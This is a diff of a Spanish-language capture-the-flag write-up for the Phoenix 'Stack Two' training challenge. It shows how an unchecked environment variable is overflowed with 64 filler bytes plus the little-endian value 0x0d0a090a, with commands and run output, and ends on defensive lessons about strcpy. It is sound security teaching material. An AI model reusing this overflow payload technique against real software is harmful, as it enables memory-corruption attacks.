@@ -14,7 +14,13 @@ tags: [PWN, Linux, Hacking, Easy]
 
 ![Untitled](/assets/images/2025-08-17-Phoenix/banner.png)
 
-Stack Two analiza las variables de entorno y cómo se pueden configurar.
+En **Stack Two** se introduce el uso de variables de entorno y cómo pueden ser manipuladas para explotar un desbordamiento de buffer.
+
+
+## Análisis del código fuente
+
+El objetivo es modificar la variable changeme con el valor 0x0d0a090a. Para lograrlo, el programa copia sin validación el contenido de la variable de entorno ExploitEducation al buffer locals.buffer, lo que abre la puerta a un buffer overflow.
+
 
 ```c
 /*
@@ -82,7 +88,9 @@ int main(int argc, char **argv) {
 
 ```
 
-al correr el binario dice que se debe establecer la variable de entorno ExploitEducation 
+**Ejecución del binario**
+
+Si ejecutamos el binario sin definir la variable de entorno, aparece un mensaje de error:
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-two 
@@ -90,7 +98,7 @@ Welcome to phoenix/stack-two, brought to you by https://exploit.education
 stack-two: please set the ExploitEducation environment variable
 ```
 
-vemos que al poner la variable con los 64 caracteres de A ya nos da la respuesta de que la variable está en   0x00000000
+Definimos la variable con 64 caracteres de A y con esto ya nos da la respuesta de que la variable está en 0x00000000
 
 ```jsx
 user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -101,7 +109,9 @@ Almost! changeme is currently 0x00000000, we want 0x0d0a090a
 
 ```
 
-Realizamos el mismo procedimiento antorior y ponemos BBBB despues de los 64 caracteres y vemos que la respuesta de la variable es 0x42424242
+**Confirmando el overflow**
+
+Si añadimos BBBB (0x42 en ASCII) después de los 64 A, el valor de changeme cambia a 0x42424242: Esto confirma que estamos sobreescribiendo la variable.
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
@@ -110,8 +120,10 @@ Welcome to phoenix/stack-two, brought to you by https://exploit.education
 Almost! changeme is currently 0x42424242, we want 0x0d0a090a
 
 ```
+**Explotación**
 
-Ahora le agregamos lo caracteres solicitados por el reto y cuando lo corremos el binario vemos que nos da el mensaje que envía una vez se explota correctamente 
+Ahora sobreescribimos con el valor solicitado 0x0d0a090a, cuidando el endianness (little-endian en x86): \x0A\x09\x0A\x0D y con esto confirmamos que se logra el reto
+
 
 ```c
 user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c 'print "A"*64 + "\x0A\x09\x0A\x0D"')
@@ -120,7 +132,9 @@ Welcome to phoenix/stack-two, brought to you by https://exploit.education
 Well done, you have successfully set changeme to the correct value
 ```
 
-Se realiza el exploit para este reto 
+**Explotación con Pwntools**
+
+También podemos automatizar este proceso con un script en Python
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/2_stack-two]
@@ -153,7 +167,7 @@ Se realiza el exploit para este reto
 ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-Se evidencia el mensaje que indica que el reto fue completado
+Al ejecutar el exploit se evidencia el mensaje que indica que el reto fue resuelto
 
 ```c
 ┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/2_stack-two]
@@ -175,3 +189,15 @@ Se evidencia el mensaje que indica que el reto fue completado
 [+] Output: Welcome to phoenix/stack-two, brought to you by https://exploit.education
     Well done, you have successfully set changeme to the correct value
 ```
+
+**Conclusión**
+
+En Stack Two vimos cómo una variable de entorno puede ser aprovechada para provocar un desbordamiento de buffer y modificar variables internas del programa.
+
+El reto refuerza dos ideas clave:
+
+  - Las funciones inseguras como strcpy deben evitarse.
+
+  - Variables de entorno pueden ser un vector de ataque si no se validan correctamente.
+
+Con esta técnica pudimos manipular la variable changeme y completar el reto con éxito.
